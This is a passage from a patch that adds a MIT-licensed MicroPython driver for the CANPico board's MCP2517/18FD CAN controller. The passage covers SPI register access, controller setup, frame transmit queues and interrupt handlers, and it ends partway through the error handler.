<+>UTF-8
===================================================================
diff --git a/ports/rp2/canis/rp2_mcp251718fd.h b/ports/rp2/canis/rp2_mcp251718fd.h
new file mode 100644
--- /dev/null	(date 1620461592945)
+++ b/ports/rp2/canis/rp2_mcp251718fd.h	(date 1620461592945)
@@ -0,0 +1,31 @@
+// Copyright 2020 Canis Automotive Labs (https://canislabs.com)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
+// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
+// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
+// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
+// the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
+// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
+// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
+#ifndef RP2_MCP251718FD_H
+#define RP2_MCP251718FD_H
+
+#define TIME_CRITICAL   __attribute__((noinline, long_call, section(".time_critical")))
+#define SPI_IRQ_GPIO    (5U)
+#define DEBUG_GPIO      (0U)
+
+#ifdef CANIS_DEBUG_PIN
+#define DEBUG_SET()     (sio_hw->gpio_set = (1U << DEBUG_GPIO))
+#define DEBUG_CLEAR()   (sio_hw->gpio_clr = (1U << DEBUG_GPIO))
+#endif
+
+TIME_CRITICAL void mcp251718fd_irq_handler(void);
+
+#endif // RP2_MCP251718FD_H
Index: ports/rp2/canis/rp2_can.c
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/canis/rp2_can.c b/ports/rp2/canis/rp2_can.c
new file mode 100644
--- /dev/null	(date 1620557135470)
+++ b/ports/rp2/canis/rp2_can.c	(date 1620557135470)
@@ -0,0 +1,2716 @@
+// Copyright 2020 Canis Automotive Labs (https://canislabs.com)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy
+// of this software and associated documentation files (the "Software"), to deal
+// in the Software without restriction, including without limitation the rights
+// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+// copies of the Software, and to permit persons to whom the Software is
+// furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in
+// all copies or substantial portions of the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+// THE SOFTWARE.
+
+#include <stdio.h>
+#include <string.h>
+#include <stdarg.h>
+#include <inttypes.h>
+#include <stdbool.h>
+
+#include "common.h"
+#include "rp2_can.h"
+
+#include <hardware/irq.h>
+#include <hardware/gpio.h>
+#include <py/objstr.h>
+#include <py/stream.h>
+#include <py/runtime.h>
+#include <py/mphal.h>
+#include <py/mperrno.h>
+#include <py/runtime.h>
+
+#include <hardware/structs/scb.h>
+
+// TODO faster FIFO implementation using power-of-two masks on index values
+// TODO add option to reject all remote frames (where RX handler decides whether to reject before putting into software FIFO)
+// TODO speed up ISRs: calculate buffer addr by shadowing TEF and RX FIFO rather than use an SPI transaction to pick it up
+// TODO add low-power standby mode to API (put controller into standby, put transceiver into standby via XSTBY pin)
+// TODO more than TRIG pin 1 trigger with an OR condition between them
+// TODO create option discard the overflow 'None' in the list of received frames returned by recv()
+
+// Debug options: CAN IRQ checking looks to see if interrupts are locked out over critical sections
+// #define CAN_IRQ_CHECKING
+// #define CAN_DEBUG
+
+#ifdef CAN_DEBUG
+#define CAN_DEBUG_PRINT(fmt, args...)       printf(fmt, ##args)
+#else
+#define CAN_DEBUG_PRINT(fmt, args...)       /* */
+#endif
+
+#ifdef CAN_IRQ_CHECKING
+STATIC bool irq_locked = false;
+#define CAN_ASSERT(cond, msg)               {if (!(cond)) {mp_printf(MP_PYTHON_PRINTER, (msg));}}
+#else
+#define CAN_ASSERT(cond, msg)               /* */
+#endif
+
+// Simple GPIO functions should be inlined to ensure they are in RAM when time critical (can't rely on the
+// compiler to inline them into RAM)
+#define SPI_SELECT()                        (sio_hw->gpio_clr = (1U << SPI_CS_GPIO))
+#define SPI_DESELECT()                      (sio_hw->gpio_set = (1U << SPI_CS_GPIO))
+
+#define CRITICAL_SECTION_CHECK(s)           CAN_ASSERT(irq_locked, s)
+
+#define TRIG_SET()                          (sio_hw->gpio_set = (1U << TRIG_GPIO))
+#define TRIG_CLEAR()                        (sio_hw->gpio_clr = (1U << TRIG_GPIO))
+#define NOP()                               __asm__("nop");
+
+#define XSTBY_SET()                         (sio_hw->gpio_set = (1U << XSTBY_GPIO))
+#define XSTBY_CLEAR()                       (sio_hw->gpio_clr = (1U << XSTBY_GPIO))
+
+#ifdef CAN_IRQ_CHECKING
+#define DISABLE_GPIO_INTERRUPTS()           (irq_set_enabled(IO_IRQ_BANK0, false), irq_locked = true)
+#define ENABLE_GPIO_INTERRUPTS()            (irq_set_enabled(IO_IRQ_BANK0, true), irq_locked = false)
+#else
+#define DISABLE_GPIO_INTERRUPTS()           (irq_set_enabled(IO_IRQ_BANK0, false))
+#define ENABLE_GPIO_INTERRUPTS()            (irq_set_enabled(IO_IRQ_BANK0, true))
+#endif
+
+#define TRIG_GPIO                           (2U)
+#define XSTBY_GPIO                          (3U)
+#define SPI_CS_GPIO                         (6U)
+#define LEVEL_SENSITIVE_LOW                 (1U)
+#define EDGE_SENSITIVE_RISING               (1U << 3)
+#define MCP251718FD_SPI                     (spi1)
+#define SPI_GPIO_IRQ_PRIORITY               (1U << 6) // Default IRQ priority is 0x80 (i.e. 2, where 0 is the highest and 3 is the lowest).
+
+STATIC bool mcp251718fd_init(canmode_t mode, uint32_t brp, uint32_t tseg1, uint32_t tseg2, uint32_t sjw);
+
+void can_init(void) {
+    // Set up the root pointer to a null CAN controller object so that the memory is not allocate until CAN is used.
+    MP_STATE_PORT(rp2_can_obj) = NULL;
+}
+
+void can_deinit(void) {
+    // Called when the system is soft reset (CTRL-D in REPL).
+
+    // If the controller is initialized then take it offline and deactivate it
+    if (MP_STATE_PORT(rp2_can_obj) != NULL) {
+        // Lock out interrupts while we are altering the system
+
+        DISABLE_GPIO_INTERRUPTS();
+        // Don't want any CAN interrupts hanging over for receiving, transmitting,
+        // etc. if the root pointer has been de-allocated.
+        gpio_set_irq_enabled(SPI_IRQ_GPIO, LEVEL_SENSITIVE_LOW, false);
+
+        // The pins must have been set by the constructor so leave them as they were set until the next
+        // time the constructor runs. The TX open drain status will remain (so if the controller
+        // was offline then it will stay offline and stay in open drain)
+
+        // Ask the controller to go offline so that it won't continue to babble afterwards
+        // Note that this will take some time if there is an ongoing frame transmission/reception,
+        // but eventually it will go offline.
+        mcp251718fd_init(CAN_MODE_OFFLINE, 4U, 10U, 3U, 2U);
+
+        // Also no need now for the root pointer to exist and we can garbage collect this
+        MP_STATE_PORT(rp2_can_obj) = NULL;
+
+        // Now clear to re-enable all GPIO interrupts
+        ENABLE_GPIO_INTERRUPTS();
+        // Depending on IRQ latching in the CPU it's possible that there may be spurious interrupts
+        // but these have guards against null pointers
+    }
+}
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////// Start of MCP2517/18FD SPI drivers /////////////////////////////////////
+//////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+// Set up the pins on the Pico to interface to the MCP2517/18FD
+STATIC void pico_pin_init(void)
+{
+    // These are the defaults anyway:
+    //    spi_set_format(spi1, 8U, SPI_CPOL_0, SPI_CPHA_0, SPI_MSB_FIRST);
+    // CANPico board is clocked at 40MHz, so SPI must be no more than 18500000 (according to data sheet)
+    spi_init(MCP251718FD_SPI, 18500000);
+    gpio_set_function(8, GPIO_FUNC_SPI);        // SPI1_Rx
+    gpio_set_function(10, GPIO_FUNC_SPI);       // SPI1_SCK
+    gpio_set_function(11, GPIO_FUNC_SPI);       // SPI1_Tx
+
+    // Set XSTBY pin to software controlled
+    gpio_set_function(XSTBY_GPIO, GPIO_FUNC_SIO);
+    // Set direction: out
+    gpio_set_dir(XSTBY_GPIO, GPIO_OUT);
+    // Set the XSTBY pin to 0 to enable the transceiver
+    XSTBY_CLEAR();
+
+    // Set TRIGGER pin to software controlled
+    gpio_set_function(TRIG_GPIO, GPIO_FUNC_SIO);
+    // Set direction: out
+    gpio_set_dir(TRIG_GPIO, GPIO_OUT);
+    // Set the TRIG pin to 0
+    TRIG_CLEAR();
+
+#ifdef CANPICO_DEBUG_PIN
+    // Set debug pin to software controlled
+    gpio_set_function(DEBUG_GPIO, GPIO_FUNC_SIO);
+    // Set direction: out
+    gpio_set_dir(DEBUG_GPIO, GPIO_OUT);
+    // Set the DEBUG pin to 0
+    DEBUG_CLEAR();
+#endif
+
+    gpio_set_function(SPI_CS_GPIO, GPIO_FUNC_SIO);
+    // Set direction: out
+    gpio_set_dir(SPI_CS_GPIO, GPIO_OUT);
+    // Deselect the MCP2517/18FD
+    gpio_set_mask(1U << SPI_CS_GPIO);
+}
+
+// RP2040 is little-endian, SPI reads the words in little endian format (first byte is lowest bits)
+STATIC TIME_CRITICAL void mcp251718fd_spi_write_word(uint32_t addr, uint32_t word)
+{
+    // Must be called with interrupts locked
+    CRITICAL_SECTION_CHECK("C1");
+
+    uint8_t buf[6];
+    // MCP2517/18FD SPI transaction = command/addr, 4 bytes
+    buf[0] = 0x20 | ((addr >> 8U) & 0xfU);
+    buf[1] = addr & 0xffU;
+    buf[2] = word & 0xffU;
+    buf[3] = (word >> 8) & 0xffU;
+    buf[4] = (word >> 16) & 0xffU;
+    buf[5] = (word >> 24) & 0xffU;
+
+    // SPI transaction
+    // The Pico is little-endian so the first byte sent is the lowest-address, which is the
+    // same as the RP2040
+    SPI_SELECT();
+    spi_write_blocking(MCP251718FD_SPI, buf, sizeof(buf));
+    SPI_DESELECT();
+}
+
+STATIC TIME_CRITICAL void mcp251718fd_spi_write_4words(uint16_t addr, const uint32_t words[])
+{
+    // Must be called with interrupts locked
+    CRITICAL_SECTION_CHECK("C2");
+
+    // Prepare a contiguous buffer for the command because the SPI hardware is pipelined and do not want to stop
+    // to switch buffers
+    uint8_t cmd[18];
+    // MCP2517/18FD SPI transaction = command/addr, 4 bytes
+    cmd[0] = 0x20 | ((addr >> 8U) & 0xfU);
+    cmd[1] = addr & 0xffU;
+
+    uint32_t i = 2U;
+    for (uint32_t j = 0; j < 4U; j++) {
+        cmd[i++] = words[j] & 0xffU;
+        cmd[i++] = (words[j] >> 8) & 0xffU;
+        cmd[i++] = (words[j] >> 16) & 0xffU;
+        cmd[i++] = (words[j] >> 24) & 0xffU;
+    }
+
+    // SPI transaction
+    SPI_SELECT();
+    spi_write_blocking(MCP251718FD_SPI, cmd, sizeof(cmd));
+    SPI_DESELECT();
+}
+
+STATIC TIME_CRITICAL uint32_t mcp251718fd_spi_read_word(uint16_t addr)
+{
+    // Must be called with interrupts locked
+    CRITICAL_SECTION_CHECK("C3");
+
+    uint8_t cmd[6];
+    uint8_t resp[6];
+
+    cmd[0] = 0x30 | ((addr >> 8U) & 0xfU);
+    cmd[1] = addr & 0xffU;
+    // TODO can remove the following because not strictly necessary (but useful for debugging with a logic analyzer)
+    cmd[2] = 0xdeU;
+    cmd[3] = 0xadU;
+    cmd[4] = 0xbeU;
+    cmd[5] = 0xefU;
+
+    // SPI transaction
+    SPI_SELECT();
+    spi_write_read_blocking(MCP251718FD_SPI, cmd, resp, sizeof(cmd));
+    SPI_DESELECT();
+
+    uint32_t word = ((uint32_t)resp[2]) | ((uint32_t)resp[3] << 8) | ((uint32_t)resp[4] << 16) | ((uint32_t)resp[5] << 24);
+    return word;
+}
+
+STATIC TIME_CRITICAL void mcp251718fd_spi_read_words(uint16_t addr, uint32_t *words, uint32_t n)
+{
+    // Must be called with interrupts locked
+    CRITICAL_SECTION_CHECK("C4");
+
+    uint8_t buf[2];
+
+    // MCP2517/18FD SPI transaction = command/addr, 4 bytes
+    buf[0] = 0x30 | ((addr >> 8U) & 0xfU);
+    buf[1] = addr & 0xffU;
+
+    // SPI transaction
+    SPI_SELECT();
+    // Send command, which flushes the pipeline then resumes
+    spi_write_blocking(spi1, buf, 2U);
+    // Bulk data
+    spi_read_blocking(spi1, 0xaa, (uint8_t *)(words), 4U * n);
+    SPI_DESELECT();
+}
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////// End of MCP2517/18FD SPI drivers /////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////// Start of MCP2517/18FD drivers //////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+STATIC TIME_CRITICAL void init_tx_buffers(rp2_can_obj_t *self);
+
+#define         OSC             (0xe00U)
+#define         IOCON           (0xe04U)
+#define         CRC             (0xe08U)
+#define         ECCCON          (0xe0cU)
+#define         ECCSTAT         (0xe10U)
+#define         DEVID           (0xe14U)
+#define         C1CON           (0x000U)
+#define         C1NBTCFG        (0x004U)
+#define         C2DBTCFG        (0x008U)
+#define         C1TDC           (0x00cU)
+#define         C1TBC           (0x010U)
+#define         C1TSCON         (0x014U)
+#define         C1VEC           (0x018U)
+#define         C1INT           (0x01cU)
+#define         C1RXIF          (0x020U)
+#define         C1TIF           (0x024U)
+#define         C1RXOVIF        (0x028U)
+#define         C1TXATIF        (0x02cU)
+#define         C1TXREQ         (0x030U)
+#define         C1TREC          (0x034U)
+#define         C1BDIAG0        (0x038U)
+#define         C1BDIAG1        (0x03cU)
+#define         C1TEFCON        (0x040U)
+#define         C1TEFSTA        (0x044U)
+#define         C1TEFUA         (0x048U)
+#define         C1TXQCON        (0x050U)
+#define         C1TXQSTA        (0x054U)
+#define         C1TXQUA         (0x058U)
+#define         C1FIFOCON1      (0x05cU)
+#define         C1FIFOSTA1      (0x060U)
+#define         C1FIFOUA1       (0x064U)
+#define         C1FLTCON(n)     (((n) * 4U) + 0x1d0U)
+#define         C1FLTOBJ(n)     (((n) * 8U) + 0x1f0U)
+#define         C1MASK(n)       (((n) * 8U) + 0x1f4U)
+
+// Hard reset of the MCP2517/18FD
+STATIC void mcp251718fd_reset(void)
+{
+    uint8_t buf[2] = {0, 0};
+
+    SPI_SELECT();
+    spi_write_blocking(MCP251718FD_SPI, buf, 2U);
+    SPI_DESELECT();
+}
+
+STATIC TIME_CRITICAL void mcp251718fd_set_pins(bool tx_open_drain)
+{
+    // Must be called with interrupts locked
+    CRITICAL_SECTION_CHECK("C5");
+
+    // Set SYSCLK to 40MHz, the external crystal, and don't use the PLL
+    mcp251718fd_spi_write_word(OSC, 0);
+    // Set up IOCON by setting:
+    // SOF=1 to select SOF on CLKO
+    // TXCANOD=1 to select open collector transmit pin
+    // PM0=1 to use pin as GPIO1
+    // PM0=1 to use pin as GPIO0
+    // TRIS1=1 to select GPIO1 as an input
+    // TRIS0=1 to select GPIO0 as an input
+    uint32_t word = (1U << 29) | (1U << 25) | (1U << 24) | (1U << 1) | (1U << 0);
+    if (tx_open_drain) {
+        word = 1U << 28;
+    }
+    mcp251718fd_spi_write_word(IOCON, word);
+}
+
+// This is called after the mode change to normal has occurred so that there won't be a interrupt
+// coming from configuration to normal mode (which would be confused with a bus-off interrupt)
+STATIC TIME_CRITICAL void mcp251718fd_enable_interrupts(void)
+{
+    CRITICAL_SECTION_CHECK("C6");
+
+    // Enable interrupts
+    // IVMIE -  CAN error
+    // CERRIE - CAN error status (error passive, bus-off, etc.)
+    // TEFIE - transmit event FIFO
+    // RXIE - receive FIFO
+    // Dismiss all interrupt flags
+    mcp251718fd_spi_write_word(C1INT, (1U << 31) | (1U << 29) | (1U << 20) |(1U << 17));
+}
+
+// Request config mode, returns true if request accepted and configured
+// After a hard reset this should always succeed
+STATIC bool mcp251718fd_init(canmode_t mode, uint32_t brp, uint32_t tseg1, uint32_t tseg2, uint32_t sjw)
+{
+    // NB: The MCP2517/18FD pins must have been initialized before calling this function
+
+    // Must be called with interrupts locked
+    CRITICAL_SECTION_CHECK("C7");
+
+    // Request config mode
+    mcp251718fd_spi_write_word(C1CON, 4U << 24);
+
+    bool config_mode = ((mcp251718fd_spi_read_word(C1CON) >> 21) & 0x7U) == 4U;
+
+    if (config_mode) {
+        // Set clock and I/O pins (set TX pin to open drain if offline because GPIO pin connected to TX might be used)
+        mcp251718fd_set_pins(false);
+        // Set bit rate according to profile
+        // FSYSCLK is 40MHz, 25ns clock period
+
+        mcp251718fd_spi_write_word(C1NBTCFG, (brp << 24) | (tseg1 << 16) | (tseg2 << 8) | sjw);
+
+        // Set timestamping counter
+        // Set prescaler to /40 to count microseconds
+        mcp251718fd_spi_write_word(C1TSCON, (1U << 16) | 39U);
+
+        // Transmit event FIFO control register
+        // FSIZE 32-deep
+        // TEFTSEN Timestamp transmissions
+        // TEFNEIIE not empty interrupt enable
+        mcp251718fd_spi_write_word(C1TEFCON, (0x1fU << 24) | (1U << 5) | (1U << 0));
+
+        // Transmit queue control register
+        // FSIZE 32-deep
+        // TXAT Unlimited retransmissions (this field isn't active but set it anyway)
+        mcp251718fd_spi_write_word(C1TXQCON, (0x1fU << 24) | (3U << 21));
+
+        // FIFO 1 is the receive FIFO
+        // FSIZE 32-deep
+        // RXTSEN Timestamp receptions
+        // TFNRFNIE interrupts enabled
+        mcp251718fd_spi_write_word(C1FIFOCON1, (0x1fU<< 24) | (1U << 5) | (1U << 0));
+
+        mcp251718fd_enable_interrupts();
+        ///// THIS COMES LAST: WILL SET EVERYTHING RUNNING
+
+        // Enable transmit queue, store in transmit event FIFO, CAN 2.0 mode
+        // Select mode
+        uint32_t reqop;
+        switch (mode) {
+            default:
+            case CAN_MODE_NORMAL:
+                reqop = 6U;
+                break;
+            case CAN_MODE_LISTEN_ONLY:
+                reqop = 3U;
+                break;
+            case CAN_MODE_ACK_ONLY:
+                reqop = 7U;
+                break;
+            case CAN_MODE_OFFLINE:
+                reqop = 4U;
+                break;
+        }
+        mcp251718fd_spi_write_word(C1CON, (1U << 19) | (1U << 20) | (reqop << 24));
+    }
+
+    return config_mode;
+}
+
+// Return the device ID
+STATIC uint32_t mcp251718fd_hard_reset(void)
+{
+    // Must be called with interrupts locked
+    CRITICAL_SECTION_CHECK("C8");
+
+    // Reset the controller, set the clocks
+    mcp251718fd_reset();
+    mcp251718fd_set_pins(false);
+    return mcp251718fd_spi_read_word(DEVID);
+}
+
+// This is the main function for transmitting a frame
+// Returns false if no room
+STATIC TIME_CRITICAL bool mcp251718fd_send_frame(rp2_canframe_obj_t *frame, bool fifo, can_tx_queue_t *tx_queue, can_tx_fifo_t *tx_fifo)
+{
+    // Must be called with interrupts locked
+    CRITICAL_SECTION_CHECK("C9");
+
+    // (it can be called from ISR or from background)
+
+    if (!fifo || tx_queue->fifo_slot == MCP251718FD_TX_QUEUE_SIZE) {
+        // Put the frame in the transmit queue
+        if (tx_queue->num_free_slots == 0) {
+            // No room in the transmit queue
+            CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "No room in the transmit queue\n");
+            return false;
+        }
+        else {
+            // Write frame to a transmit queue message slot
+            // This must fit into 16 bits because the buffer space in total is only 2Kbytes, and starts from 0x400
+            uint16_t c1txqua = (uint16_t)mcp251718fd_spi_read_word(C1TXQUA);
+            uint16_t addr = c1txqua + 0x400U;
+            // (Transmit event slots start at an offset of 0 (a total of 3 x 4 bytes x 32 slots = 384 bytes)
+            // Transmit queue slots start at an offset 0x180, and each is 16 bytes (we allocated 16 bytes to the
+            // payload even though handling only CAN frames, meaning the whole buffer slot is 16 bytes)
+            // Work out what the slot number is for this free slot
+            uint32_t free_slot = (c1txqua - 0x180U) >> 4;
+
+            if (free_slot >= MCP251718FD_TX_QUEUE_SIZE) {
+                mp_printf(MP_PYTHON_PRINTER, "free_slot=%d\n", free_slot);
+                mp_printf(MP_PYTHON_PRINTER, "c1txqua=%d\n", c1txqua);
+                return false;
+            }
+
+            CAN_ASSERT(free_slot < MCP251718FD_TX_QUEUE_SIZE, "Z0");
+
+            // Copy the frame into the message slot in the controller
+            // Layout of TXQ message object:
+            uint32_t t[4];
+            t[0] = ((frame->can_id & 0x3ffffU) << 11) | ((frame->can_id >> 18) & 0x7ff);
+            t[1] = (free_slot << 9) | frame->dlc;
+            CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "seq=%d\n",tx_queue->free_slot);
+            if (frame->can_id & (1U << 29)) {
+                t[1] |= (1U << 4);    // IDE
+            }
+            if (frame->remote) {
+                t[1] |= (1U << 5);
+            }
+            // Payload words are in little endian format: first byte is bits 0-7
+            t[2] = frame->payload[0];
+            t[3] = frame->payload[1];
+
+            // Mark slot and update next free slot
+            if (fifo) {
+                tx_queue->fifo_slot = free_slot;
+            }
+            tx_queue->num_free_slots--;
+            tx_queue->frames[free_slot] = frame;
+
+            frame->timestamp_valid = false;
+            CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "new free_slot=%d\n",tx_queue->free_slot);
+            CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "free_bitmap=0x%08"PRIx32"\n", tx_queue->free_bitmap);
+
+            // TODO could use a DMA channel and chain these SPI transactions using DMA
+            // Write this block over SPI
+            CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "t[0]=0x%08"PRIx32"\n", t[0]);
+            mcp251718fd_spi_write_4words(addr, t);
+
+            // Now tell the controller to take the frame and move C1TXQUA
+            // Set UINC=1, TXREQ=1
+            // Transmit queue control register
+            mcp251718fd_spi_write_word(C1TXQCON, (1U << 8) | (1U << 9));
+
+            return true;
+        }
+    }
+    else {
+        if (tx_fifo->num_free_slots == 0) {
+            CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "No room in the FIFO\n");
+            // No room in the FIFO
+            return false;
+        }
+        else {
+            // Head of FIFO is in the priority queue so put this frame into the TX FIFO
+            tx_fifo->num_free_slots--;
+            tx_fifo->frames[tx_fifo->tail_idx++] = frame;
+            if(tx_fifo->tail_idx == MCP251718FD_TX_FIFO_SIZE) {
+                // Wrap the tail index
+                tx_fifo->tail_idx = 0;
+            }
+            frame->timestamp_valid = false;
+            return true;
+        }
+    }
+}
+
+// At present there is a single CAN controller on the board so there is no need to work out which
+// device is interrupting, etc.
+
+// Called to deal with a frame that has been transmitted (actually the TEF IRQ on the device)
+STATIC TIME_CRITICAL void mcp251718fd_tx_handler(void)
+{
+    rp2_can_obj_t *self = MP_STATE_PORT(rp2_can_obj);
+    if (self == NULL) {
+        // Spurious interrupt: a race with the interrupt being raised and the source of interrupts being
+        // disabled
+        return;
+    }
+
+    // Find out which frame was sent (using the SEQ field), get the frame object handle,
+    // fill in the timestamp, remove the frame from the software queue, adding a FIFO queue
+    // frame if necessary
+    uint16_t addr = (uint16_t)mcp251718fd_spi_read_word(C1TEFUA) + 0x400U;
+
+    // Don't care about the CAN frame ID (we know it already), just SEQ and timestamp
+    uint32_t details[2];
+    mcp251718fd_spi_read_words(addr + 4U, details, 2U);
+    uint8_t seq = (uint8_t)(details[0] >> 9);
+
+    CAN_ASSERT(seq <= MCP251718FD_TX_QUEUE_SIZE, "A1");
+
+    uint32_t timestamp = details[1];
+
+    bool fifo = (seq == self->tx_queue.fifo_slot);
+
+    // Remove frame from the transmit queue
+    if (fifo) {
+        self->tx_queue.fifo_slot = MCP251718FD_TX_FIFO_SIZE;
+    }
+    // Update frame's timestamp and fetch its tag
+    self->tx_queue.frames[seq]->timestamp = timestamp;
+    self->tx_queue.frames[seq]->timestamp_valid = true;
+    uint32_t tag = self->tx_queue.frames[seq]->tag;
+    // Remove frame from transmit queue (most of the management of the free space in the
+    // transmit queue is done by the hardware, but we keep track of how many free slots
+    // to save SPI transactions asking for them)
+    self->tx_queue.num_free_slots++;
+
+    // Remove reference to frame so it can eventually be garbage collected if appropriate
+    self->tx_queue.frames[seq] = 0;
+
+    // If this is a FIFO frame and there are more FIFO frames, then queue that one
+    if (fifo && self->tx_fifo.num_free_slots < MCP251718FD_TX_FIFO_SIZE) {
+        self->tx_fifo.num_free_slots++;
+        rp2_canframe_obj_t *frame = self->tx_fifo.frames[self->tx_fifo.head_idx];
+        // Zero out the frame so that there is no reference to it for later garbage collection
+        self->tx_fifo.frames[self->tx_fifo.head_idx] = 0;
+        // Pop head of transmit FIFO
+        self->tx_fifo.head_idx++;
+        if(self->tx_fifo.head_idx == MCP251718FD_TX_FIFO_SIZE) {
+            // Wrap the head index
+            self->tx_fifo.head_idx = 0;
+        }
+        mcp251718fd_send_frame(frame, true, &self->tx_queue, &self->tx_fifo);
+    }
+
+    ////// Keep track of the transmit event //////
+    // TODO the FIFO code should really be made generic (can't use compiler to inline due to XIP issue)
+    if (self->event_fifo.free <= 1U) {
+        // No space for it - discard event, marking the last free slot as an "overflow"; this will become
+        // a None object when get_tx_events() is called
+        if (self->event_fifo.free == 0) {
+            // Do nothing: there must already an overflow event at the back of the FIFO
+            self->event_fifo.events[self->event_fifo.dropped_event_idx].info.overflow_cnt++;
+        }
+        else {
+            // Add an 'overflow' event to the back of the queue
+            self->event_fifo.free = 0;
+            uint8_t idx = self->event_fifo.tail_idx++;
+            self->event_fifo.dropped_event_idx = idx;
+            if (self->event_fifo.tail_idx == TX_EVENT_FIFO_SIZE) {
+                self->event_fifo.tail_idx = 0;
+            }
+            self->event_fifo.events[idx].event_type = EVENT_TYPE_OVERFLOW;
+            // The tag is used as a dropped event counter
+            self->event_fifo.events[idx].info.overflow_cnt = 0;
+            // The timestamp is the time of the first drop
+            self->event_fifo.events[idx].timestamp = timestamp;
+        }
+    }
+    else {
+        // Put the event into the FIFO
+        self->event_fifo.free--;
+        uint8_t idx = self->event_fifo.tail_idx++;
+        if (self->event_fifo.tail_idx == TX_EVENT_FIFO_SIZE) {
+            self->event_fifo.tail_idx = 0;
+        }
+        self->event_fifo.events[idx].timestamp = timestamp;
+        self->event_fifo.events[idx].info.frame_tag = tag;
+        self->event_fifo.events[idx].event_type = EVENT_TYPE_TRANSMITTED_FRAME;
+    };
+
+    // Pop event in controller, keep timestamps enabled, keep not-empty interrupts enabled
+    // MCP2517/18FD interrupts are level-sensitive so GPIO must be set to level sensitive; interrupt
+    // will be re-raised if still not empty when serviced.
+    // Set FSIZE, UINC, TEFTSEN, TEFNEIIE
+    mcp251718fd_spi_write_word(C1TEFCON, (0x1fU << 24) | (1U << 8) | (1U << 5) | (1U << 0));
+}
+
+STATIC TIME_CRITICAL void mcp251718fd_bus_off_handler(void)
+{
+    rp2_can_obj_t *self = MP_STATE_PORT(rp2_can_obj);
+    if (self == NULL) {
+        // Spurious interrupt: a race with the interrupt being raised and the source of interrupts being
+        // disabled
+        return;
+    }
+    // Frames should not be accepted for transmission if not yet in normal mode.
+    uint32_t c1trec = mcp251718fd_spi_read_word(C1TREC);
+
+    if (c1trec & (1U << 21)) { // TXBO
+        // Bus-off will erase the transmit queues, so all the frames we queued are now going to be
+        // thrown away, so discard them in the software queues too
+
+        // Discard all the frames
+        init_tx_buffers(self);
+    }
+    // This could be warning about error passive and other states, but we don't care about those
+    // Dismisses CERRIF interrupts (and others)
+    mcp251718fd_enable_interrupts();
+}
+
+STATIC TIME_CRITICAL void mcp251718fd_error_handler(void)
+{
+    rp2_can_obj_t *self = MP_STATE_PORT(rp2_can_obj);
+    if (self == NULL) {
+        // Spurious interrupt: a race with the interrupt being raised and the source of interrupts being
+        // disabled
+        return;
+    }
+
+    // Read the time (won't be very accurate because of the time taken to get here)
+    uint32_t timestamp = mcp251718fd_spi_read_word(C1TBC);
+
+    // Trigger for error
+    if (self->triggers[0].enabled && self->triggers[0].on_error) {
+        TRIG_SET();
+    }
+
+    if (self->recv_errors) {
+        // Get information about the error
+        uint32_t c1bdiag1 = mcp251718fd_spi_read_word(C1BDIAG1);
+
+        // Put the error in to the receive FIFO since it's kind of a received thing, even if not a frame
+        if (self->rx_fifo.free <= 1U) {
+            // No space for it - mark the last slot as an overflow and then future error / received frames can
+            // increment the counter
+            if (self->rx_fifo.free == 0) {
+                // There must already an overflow frame at the back of the queue
+                self->rx_fifo.rx_events[self->rx_fifo.dropped_event_idx].info.overflow_cnt.error_cnt++;
+                if (self->rx_fifo.rx_events[self->rx_fifo.dropped_event_idx].info.overflow_cnt.error_cnt == 0) {
+                    // Overflowed so roll it back to make it sticky
+                    self->rx_fifo.rx_events[self->rx_fifo.dropped_event_idx].info.overflow_cnt.error_cnt--;
+                }
+            } else {
+                // Add an 'overflow' frame to the back of the queue
+                self->rx_fifo.free = 0;
+                uint8_t idx = self->rx_fifo.tail_idx++;
+                self->rx_fifo.dropped_event_idx = idx;
+                if (self->rx_fifo.tail_idx == RX_FIFO_SIZE) {
+                    self->rx_fifo.tail_idx = 0;
+                }
+                self->rx_fifo.rx_events[idx].event_type = EVENT_TYPE_OVERFLOW;
+                // Initialize the counters
